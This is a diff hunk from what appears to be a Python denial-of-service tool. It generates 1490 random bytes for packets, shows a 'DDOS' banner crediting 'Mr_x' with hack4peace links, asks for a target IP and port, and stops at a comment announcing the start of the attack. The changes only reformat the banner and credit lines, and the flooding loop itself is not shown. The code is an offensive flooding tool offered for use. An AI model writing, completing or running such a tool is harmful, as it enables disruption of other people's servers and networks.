@@ -11,15 +11,15 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-print (Fore.GREEN + "             ___  ___  ___  ___ ") 
+print (Fore.GREEN + "              ___  ___  ___  ___ ") 
 print ("             | . \| . \| . |/ __> ")
 print ("             | | || | || | |\__ \ ")
 print ("             |___/|___/`___|<___/ ")
       
-print "                 Created by: Mr_x"
-print "     Github: https://github.com/official-hack4peace"
-print "     YouTube: https://youtube.com/channel/UCHTT9mz7Fdtn3TdotMjynGg"
-print "     Instagram: https://instagram.com/official_hack4peace01"
+print "Created by: Mr_x"
+print "Github: https://github.com/official-hack4peace"
+print "YouTube: https://youtube.com/channel/UCHTT9mz7Fdtn3TdotMjynGg"
+print "Instagram: https://instagram.com/official_hack4peace01"
 ip = raw_input(Fore.RED + "Target IP: ")
 port = input("Port: ")
 # starting ddos attack
